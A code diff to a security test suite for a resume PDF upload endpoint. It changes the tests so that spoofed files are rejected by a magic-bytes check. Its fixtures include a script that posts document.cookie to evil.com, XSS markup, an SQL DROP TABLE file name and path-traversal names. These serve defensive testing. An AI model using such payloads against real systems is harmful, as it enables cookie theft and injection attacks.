@@ -96,12 +96,17 @@ function createUploadRequest(
 
 function createPdfFile(
   name: string,
-  content: string | ArrayBuffer = 'PDF content',
+  content: string | ArrayBuffer = '%PDF content',
   type = 'application/pdf',
   sizeOverride?: number,
 ): File {
   if (sizeOverride) {
-    const buffer = new ArrayBuffer(sizeOverride);
+    // Prepend %PDF magic bytes so the file passes the magic bytes check
+    const magic = new Uint8Array([0x25, 0x50, 0x44, 0x46]); // %PDF
+    const rest = new Uint8Array(sizeOverride - 4);
+    const buffer = new Uint8Array(sizeOverride);
+    buffer.set(magic);
+    buffer.set(rest, 4);
     return new File([buffer], name, { type });
   }
   return new File([content], name, { type });
@@ -171,7 +176,7 @@ describe('Security: File Upload — Resume Endpoint', () => {
     it('accepts file with type application/pdf', async () => {
       createAuthSuccess();
       const { POST } = await import('@/app/api/student/resume/route');
-      const file = createPdfFile('resume.pdf', 'PDF content', 'application/pdf');
+      const file = createPdfFile('resume.pdf', '%PDF content', 'application/pdf');
       const req = createUploadRequest(file);
       const res = await POST(req);
       expect(res.status).toBe(200);
@@ -234,42 +239,53 @@ describe('Security: File Upload — Resume Endpoint', () => {
   });
 
   // =========================================================================
-  // 3. MIME type spoofing — documents lack of magic byte validation
+  // 3. MIME type spoofing — magic bytes check rejects non-PDF content
   // =========================================================================
-  describe('MIME spoofing (client-provided type, no magic bytes check)', () => {
-    it('accepts HTML content disguised as application/pdf', async () => {
-      const { mockStorageUpload } = createAuthSuccess();
+  describe('MIME spoofing (magic bytes check rejects non-PDF content)', () => {
+    it('rejects HTML content disguised as application/pdf', async () => {
+      createAuthSuccess();
       const { POST } = await import('@/app/api/student/resume/route');
       const htmlContent = '<html><body><script>alert("XSS")</script></body></html>';
       const file = createPdfFile('malicious.pdf', htmlContent, 'application/pdf');
       const req = createUploadRequest(file);
       const res = await POST(req);
-      // Route only checks file.type — no magic bytes validation
-      expect(res.status).toBe(200);
-      expect(mockStorageUpload).toHaveBeenCalled();
+      expect(res.status).toBe(400);
+      const body = await res.json();
+      expect(body.error).toContain('PDF');
     });
 
-    it('accepts JavaScript content disguised as application/pdf', async () => {
-      const { mockStorageUpload } = createAuthSuccess();
+    it('rejects JavaScript content disguised as application/pdf', async () => {
+      createAuthSuccess();
       const { POST } = await import('@/app/api/student/resume/route');
       const jsContent = 'const payload = () => { fetch("https://evil.com/steal", { method: "POST", body: document.cookie }); };';
       const file = createPdfFile('exploit.pdf', jsContent, 'application/pdf');
       const req = createUploadRequest(file);
       const res = await POST(req);
-      expect(res.status).toBe(200);
-      expect(mockStorageUpload).toHaveBeenCalled();
+      expect(res.status).toBe(400);
+      const body = await res.json();
+      expect(body.error).toContain('PDF');
     });
 
-    it('accepts EXE-like content disguised as application/pdf', async () => {
-      const { mockStorageUpload } = createAuthSuccess();
+    it('rejects EXE-like content disguised as application/pdf', async () => {
+      createAuthSuccess();
       const { POST } = await import('@/app/api/student/resume/route');
-      // MZ is the magic bytes for PE/EXE files
+      // MZ is the magic bytes for PE/EXE files — not the %PDF signature
       const exeContent = 'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00';
       const file = createPdfFile('trojan.pdf', exeContent, 'application/pdf');
       const req = createUploadRequest(file);
       const res = await POST(req);
+      expect(res.status).toBe(400);
+      const body = await res.json();
+      expect(body.error).toContain('PDF');
+    });
+
+    it('accepts content that genuinely starts with %PDF magic bytes', async () => {
+      createAuthSuccess();
+      const { POST } = await import('@/app/api/student/resume/route');
+      const file = createPdfFile('real.pdf', '%PDF-1.4 legitimate content', 'application/pdf');
+      const req = createUploadRequest(file);
+      const res = await POST(req);
       expect(res.status).toBe(200);
-      expect(mockStorageUpload).toHaveBeenCalled();
     });
   });
 
@@ -299,14 +315,14 @@ describe('Security: File Upload — Resume Endpoint', () => {
       expect(body.error).toBe('File size must be less than 5MB');
     });
 
-    it('accepts zero-byte file (passes size check)', async () => {
+    it('rejects zero-byte file (fails magic bytes check)', async () => {
       createAuthSuccess();
       const { POST } = await import('@/app/api/student/resume/route');
       const file = createPdfFile('empty.pdf', '', 'application/pdf');
       const req = createUploadRequest(file);
       const res = await POST(req);
-      // Zero-byte file passes both type and size checks
-      expect(res.status).toBe(200);
+      // Zero-byte file has no magic bytes — rejected as non-PDF
+      expect(res.status).toBe(400);
     });
 
     it('rejects extremely large file (100MB)', async () => {
@@ -329,7 +345,7 @@ describe('Security: File Upload — Resume Endpoint', () => {
     it('filename ../../etc/passwd is stored in metadata but upload path is fixed', async () => {
       const { mockChain, mockStorageUpload } = createAuthSuccess();
       const { POST } = await import('@/app/api/student/resume/route');
-      const file = createPdfFile('../../etc/passwd', 'PDF content', 'application/pdf');
+      const file = createPdfFile('../../etc/passwd', '%PDF content', 'application/pdf');
       const req = createUploadRequest(file);
       const res = await POST(req);
       expect(res.status).toBe(200);
@@ -349,7 +365,7 @@ describe('Security: File Upload — Resume Endpoint', () => {
     it('filename ../malicious.pdf is stored in metadata but upload path is fixed', async () => {
       const { mockStorageUpload } = createAuthSuccess();
       const { POST } = await import('@/app/api/student/resume/route');
-      const file = createPdfFile('../malicious.pdf', 'PDF content', 'application/pdf');
+      const file = createPdfFile('../malicious.pdf', '%PDF content', 'application/pdf');
       const req = createUploadRequest(file);
       const res = await POST(req);
       expect(res.status).toBe(200);
@@ -363,7 +379,7 @@ describe('Security: File Upload — Resume Endpoint', () => {
     it('filename with null bytes is stored in metadata but upload path is unaffected', async () => {
       const { mockChain, mockStorageUpload } = createAuthSuccess();
       const { POST } = await import('@/app/api/student/resume/route');
-      const file = createPdfFile('resume\x00.pdf', 'PDF content', 'application/pdf');
+      const file = createPdfFile('resume\x00.pdf', '%PDF content', 'application/pdf');
       const req = createUploadRequest(file);
       const res = await POST(req);
       expect(res.status).toBe(200);
@@ -387,7 +403,7 @@ describe('Security: File Upload — Resume Endpoint', () => {
       const { mockChain } = createAuthSuccess();
       const { POST } = await import('@/app/api/student/resume/route');
       const longName = 'a'.repeat(1001) + '.pdf';
-      const file = createPdfFile(longName, 'PDF content', 'application/pdf');
+      const file = createPdfFile(longName, '%PDF content', 'application/pdf');
       const req = createUploadRequest(file);
       const res = await POST(req);
       expect(res.status).toBe(200);
@@ -401,7 +417,7 @@ describe('Security: File Upload — Resume Endpoint', () => {
       const { mockChain } = createAuthSuccess();
       const { POST } = await import('@/app/api/student/resume/route');
       const xssName = '<script>alert(1)</script>.pdf';
-      const file = createPdfFile(xssName, 'PDF content', 'application/pdf');
+      const file = createPdfFile(xssName, '%PDF content', 'application/pdf');
       const req = createUploadRequest(file);
       const res = await POST(req);
       expect(res.status).toBe(200);
@@ -415,7 +431,7 @@ describe('Security: File Upload — Resume Endpoint', () => {
       const { mockChain } = createAuthSuccess();
       const { POST } = await import('@/app/api/student/resume/route');
       const sqliName = "'; DROP TABLE resume; --.pdf";
-      const file = createPdfFile(sqliName, 'PDF content', 'application/pdf');
+      const file = createPdfFile(sqliName, '%PDF content', 'application/pdf');
       const req = createUploadRequest(file);
       const res = await POST(req);
       expect(res.status).toBe(200);
